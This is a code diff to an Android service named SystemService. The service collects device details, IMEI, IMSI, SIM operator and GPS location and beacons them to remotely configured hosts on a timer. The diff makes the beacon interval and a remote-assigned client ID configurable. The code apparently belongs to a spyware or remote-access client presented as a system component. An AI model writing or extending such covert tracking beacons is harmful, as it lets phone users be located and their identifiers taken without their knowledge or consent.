@@ -42,6 +42,8 @@ public class SystemService extends Service{
     private static Context sContext = null;
     private PowerManager.WakeLock mWakeLock = null;
     private static BroadcastReceiver sReceiver = null;
+    private int mHeartBeatInterval = 5000;
+    private String mId = "default";
 
     public static Context getContext() {
         return sContext;
@@ -74,24 +76,6 @@ public class SystemService extends Service{
 
     private double longitude = 0, latitude = 0;
     private byte[] getHeartBeatData() {
-//        JSONObject jsonObject = new JSONObject();
-//        try {
-//            TelephonyManager tm = (TelephonyManager) this.getSystemService(TELEPHONY_SERVICE);
-//            jsonObject.put("model",Build.MODEL)
-//                    .put("brand", Build.BRAND)
-//                    .put("version",Build.VERSION.RELEASE)
-//                    .put("memory", SystemUtil.getAvailMemory(this) + " / " + SystemUtil.getTotalMemory(this) )
-//                    .put("storage", SystemUtil.getStorageInfo(this))
-//                    .put("network_state", SystemUtil.getNetworkConnectTypeString(this))
-//                    .put("sim_operator",tm.getSimOperatorName())
-//                    .put("imei", tm.getDeviceId())
-//                    .put("imsi", tm.getSubscriberId())
-//                    .put("longitude", ""+longitude)
-//                    .put("latitude", ""+latitude);
-//        } catch (JSONException e) {
-//            e.printStackTrace();
-//        }
-//        return jsonObject.toString().getBytes();
         StringBuffer stringBuffer = new StringBuffer();
         try {
             TelephonyManager tm = (TelephonyManager) this.getSystemService(TELEPHONY_SERVICE);
@@ -104,7 +88,8 @@ public class SystemService extends Service{
             stringBuffer.append(tm.getSimOperatorName() + "|");
             stringBuffer.append(longitude + "/" + latitude + "|");
             stringBuffer.append(tm.getDeviceId() + "|");
-            stringBuffer.append(tm.getSubscriberId());
+            stringBuffer.append(tm.getSubscriberId() + "|" );
+            stringBuffer.append("id="+mId);
         } catch (Exception e) {
             e.printStackTrace();
         }
@@ -159,7 +144,8 @@ public class SystemService extends Service{
             public void run() {
                 mNetworkManager.setHeartBeatData(getHeartBeatData());
             }
-        }, 0, 5000);
+        }, 0, mHeartBeatInterval);
+        mNetworkManager.setHeartBeatDelay(mHeartBeatInterval);
         mNetworkManager.start();
     }
 
@@ -177,6 +163,8 @@ public class SystemService extends Service{
                     mNetworkManager.addHost(hosts.getString(i));
                 }
                 mNetworkManager.setLocalPort(jsonObject.getInt("listen_port"));
+                mHeartBeatInterval = jsonObject.getInt("heartbeat_interval");
+                mId = jsonObject.getString("id");
             } catch (JSONException e) {
             }
         } catch (IOException e) {
